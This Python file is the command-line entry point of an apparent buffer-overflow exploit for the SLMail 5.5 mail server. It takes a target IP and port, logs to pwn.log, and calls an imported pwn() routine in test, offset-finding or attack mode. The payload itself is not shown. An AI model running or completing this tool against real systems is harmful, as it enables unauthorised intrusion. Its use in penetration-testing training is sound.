#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" main.py

Main program for SLMail exploit.

"""

from __future__ import division, print_function, absolute_import

import argparse
import sys
import logging
import time

from slmail import pwn

__author__ = "Derek Goddeau"

_logger = logging.getLogger(__name__)

def main(args):
    """ Main

    """
    setup_logs()
    _logger.debug("Starting main()")

    args = parse_args(args)
    print("[*] Initiating attack on IP address {}:{}".format(args.ip, args.port))
    if args.test:
        pwn(args.ip, args.port, 'test')
    elif args.unique:
        pwn(args.ip, args.port, 'unique')
    else:
        pwn(args.ip, args.port, 'attack')

    _logger.debug("All done, shutting down.")
    logging.shutdown()

def parse_args(args):
    """ Parse command line parameters.

    :return: command line parameters as :obj:`airgparse.Namespace`
    Args:
        args ([str]): List of strings representing the command line arguments.

    Returns:
        argparse.Namespace: Simple object with a readable string
        representation of the argument list.

    """
    parser = argparse.ArgumentParser(
        description="Buffer overflow exploit for SLMail 5.5")
    parser.add_argument(
        '-t',
        '--test',
        help="Send payload to test offset",
        action="store_true"),
    parser.add_argument(
        '-u',
        '--unique',
        help="Send unique string payload to determine offset",
        action="store_true"),
    parser.add_argument(
        'ip',
        type=str,
        help="IP address to connect to"),
    parser.add_argument(
        'port',
        type=int,
        help="Port to connect to")
    return parser.parse_args(args)


def setup_logs():
    """ Set up logger to be used between all modules.

    Set logging root and file handler configuration to default to
    ``DEBUG`` and write output to ``pwn.log``. Set console
    handler to default to ``ERROR``.

    """
    logging.basicConfig(level=logging.DEBUG, filename='pwn.log',
                        filemode='w')
    _logger.setLevel(logging.DEBUG)

    # create file handler which logs messages
    fh = logging.FileHandler('pwn.log')

    fh.setLevel(logging.DEBUG)

    # create console handler with a higher log level
    ch = logging.StreamHandler()
    ch.setLevel(logging.ERROR)

    # add the handlers to the logger
    _logger.addHandler(fh)
    _logger.addHandler(ch)


if __name__ == "__main__":

    start = time.time()
    main(sys.argv[1:])
    print("Attack completed in {} seconds".format(time.time() - start))
    sys.exit(0)
